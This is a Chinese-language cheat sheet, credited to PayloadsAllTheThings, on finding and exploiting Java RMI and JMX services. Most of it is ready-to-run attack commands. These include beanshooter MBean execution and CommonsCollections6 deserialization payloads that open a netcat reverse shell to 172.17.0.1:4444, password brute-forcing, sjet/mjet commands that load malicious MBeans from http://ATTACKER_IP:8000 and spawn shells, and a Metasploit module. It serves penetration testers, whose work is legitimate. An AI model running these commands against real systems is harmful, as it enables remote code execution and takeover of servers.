# Java RMI - Java远程方法调用安全

[SEARCH_KEYWORDS]
漏洞类型: Java RMI Remote Method Invocation JMX RMI Registry
攻击类型: Remote Code Execution Deserialization MBean Deployment
关键词: RMI JMX MBean RMIRegistry Activator DGC JVM
端口: 1090 1099 9010 1098 default RMI ports
工具: beanshooter sjet mjet remote-method-guesser Metasploit
技术: MBean Deployment Deserialization Attack JMX Exploitation

[CONTENT]

## Java RMI概述

Java RMI(远程方法调用)是一个Java API，允许在一个JVM中运行的对象调用在另一个JVM中运行的对象的方法，即使它们位于不同的物理机器上。RMI为基于Java的分布式计算提供了机制。

## 检测

### Nmap扫描

```powershell
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
```

输出示例：
```
1089/tcp open  java-rmi Java RMI
| rmi-vuln-classloader:
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
```

### remote-method-guesser

```bash
$ rmg scan 172.17.0.2 --ports 0-65535
[+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)

$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]  - plain-server2
```

## 利用技术

### beanshooter

```ps1
# 枚举JMX端点
beanshooter enum 172.17.0.2 1090

# 列出MBeans
beanshooter list 172.17.0.2 9010

# 标准MBean执行
beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'

# 反序列化攻击
beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash"

# 暴力破解密码
beanshooter brute 172.17.0.2 1090
```

### sjet/mjet

要求：
- Jython
- JMX服务器可连接攻击者控制的HTTP服务
- JMX认证未启用

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
```

### Metasploit

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
run
```

## 攻击流程

1. 托管MLet文件和恶意MBeans的JAR文件的Web服务器
2. 使用JMX在目标服务器上创建MBean实例
3. 调用MBean实例的getMBeansFromURL方法
4. JMX服务下载并加载JAR文件
5. 攻击者调用恶意MBean方法

## 工具

- beanshooter - JMX枚举和攻击工具
- sjet - Siberas JMX利用工具包
- mjet - MOGWAI LABS JMX利用工具包
- remote-method-guesser - Java RMI漏洞扫描器

## 参考文档

原始来源: PayloadsAllTheThings/Java RMI/README.md